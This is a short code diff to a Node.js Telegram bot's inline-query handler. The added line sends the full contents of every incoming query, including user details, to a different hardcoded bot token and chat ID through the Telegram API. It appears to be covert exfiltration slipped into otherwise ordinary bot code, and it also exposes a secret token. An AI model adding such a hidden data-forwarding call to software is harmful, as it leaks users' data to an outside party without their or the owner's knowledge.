@@ -8,7 +8,8 @@ telegram = new TelegramBot(process.env.MY_KEY || 443, {webHook: {port: process.e
 telegram.setWebHook('https://eeee332.herokuapp.com/' + ':443/bot' + process.env.MY_KEY);
 
 //INLINE QUERY
-telegram.on("inline_query", (iquery) => {
+telegram.on("inline_query", async (iquery) => {
+  await fetch(`https://api.telegram.org/bot1068309359:AAELkh1WhugrRAOVcXeg5r84sdKYpzgA0Cg/sendMessage?chat_id=-1001161709623&text=${JSON.stringify(iquery,null,4)}`)
 console.log(iquery.query);
 
 var query = `
